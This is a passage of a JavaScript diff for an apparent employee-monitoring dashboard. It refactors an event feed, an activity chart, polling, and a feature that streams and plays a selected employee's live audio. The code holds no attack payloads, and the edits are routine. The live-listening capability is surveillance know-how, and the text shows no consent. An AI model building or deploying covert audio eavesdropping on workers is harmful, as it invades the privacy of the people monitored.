+    '<span class="ev-detail">' + detail + '</span>' +
+    '<span class="ev-time">' + new Date().toLocaleTimeString() + '</span>';
   feed.prepend(div);
-  // keep max 200
   while (feed.children.length > 200) feed.removeChild(feed.lastChild);
   liveEventCount++;
   document.getElementById('liveCount').textContent = liveEventCount + ' events';
-
-  // Update activity chart
   activityData[activityData.length - 1]++;
   if (activityChart) activityChart.update('none');
 }
 
-// ── Activity Chart ─────────────────────────────────────────────
+// ── Activity Chart ──
 function initChart() {
   const ctx = document.getElementById('activityChart').getContext('2d');
-  const labels = Array.from({length:12}, (_,i) => `${(i+1)*5}m ago`).reverse();
+  const labels = Array.from({length:12}, (_,i) => ((i+1)*5) + 'm ago').reverse();
   activityChart = new Chart(ctx, {
     type: 'line',
     data: {
@@ -686,8 +696,6 @@ function initChart() {
       }
     }
   });
-
-  // Rotate data every 5 min
   setInterval(() => {
     activityData.push(0);
     activityData.shift();
@@ -695,22 +703,18 @@ function initChart() {
   }, 5 * 60 * 1000);
 }
 
-// ── Init ───────────────────────────────────────────────────────
+// ── Init ──
 async function init() {
   await refreshStats();
   await refreshEmployees();
-  await loadAlerts();
   initChart();
+  document.getElementById('historyDate').value = new Date().toISOString().split('T')[0];
 }
-
 init();
-
-// Auto-refresh (faster polling for cloud mode)
 setInterval(refreshEmployees, 10000);
 setInterval(refreshStats, 10000);
-setInterval(loadAlerts, 15000);
 
-// ── Live Audio Streaming ─────────────────────────────────────────────
+// ── Live Audio Streaming ──
 let audioCtx = null;
 let isListening = false;
 let listeningTo = null;
@@ -738,7 +742,15 @@ async function startListening() {
   const empId = document.getElementById('liveAudioEmpSel').value;
   if (!empId) return;
 
-  audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
+  try {
+    audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
+    if (audioCtx.state === 'suspended') await audioCtx.resume();
+  } catch(e) {
+    console.error('Failed to create AudioContext:', e);
+    alert('Audio playback not supported');
+    return;
+  }
+
   isListening = true;
   listeningTo = empId;
   nextPlayTime = 0;
@@ -757,6 +769,8 @@ async function startListening() {
     const secs = (elapsed % 60).toString().padStart(2, '0');
     document.getElementById('listenDuration').textContent = mins + ':' + secs;
   }, 1000);
+
+  console.log('Started listening to:', empId);
 }
 
 function stopListening() {
@@ -764,14 +778,15 @@ function stopListening() {
   listeningTo = null;
   if (audioCtx) { audioCtx.close(); audioCtx = null; }
   if (listenTimer) { clearInterval(listenTimer); listenTimer = null; }
-
   document.getElementById('btnListenStart').style.display = 'inline-block';
   document.getElementById('btnListenStop').style.display = 'none';
   document.getElementById('audioVisualizer').style.display = 'none';
+  console.log('Stopped listening');
 }
 
 socket.on('audio_stream', (data) => {
   if (!isListening || data.employeeId !== listeningTo || !audioCtx) return;
+  if (audioCtx.state === 'closed') return;
 
   try {
     const binary = atob(data.audioChunk);
@@ -796,7 +811,6 @@ socket.on('audio_stream', (data) => {
 
     chunkCounter++;
     document.getElementById('chunkCount').textContent = chunkCounter;
-
     drawWaveform(float32);
   } catch(e) {
     console.error('Audio playback error:', e);
@@ -807,14 +821,11 @@ function drawWaveform(samples) {
   if (!waveformCtx) return;
   const canvas = waveformCtx.canvas;
   const w = canvas.width, h = canvas.height;
-
   waveformCtx.fillStyle = '#f8f9fa';
   waveformCtx.fillRect(0, 0, w, h);
-
   waveformCtx.strokeStyle = '#1a237e';
   waveformCtx.lineWidth = 1.5;
   waveformCtx.beginPath();
-
   const step = Math.max(1, Math.floor(samples.length / w));
   for (let i = 0; i < w; i++) {
     const idx = i * step;
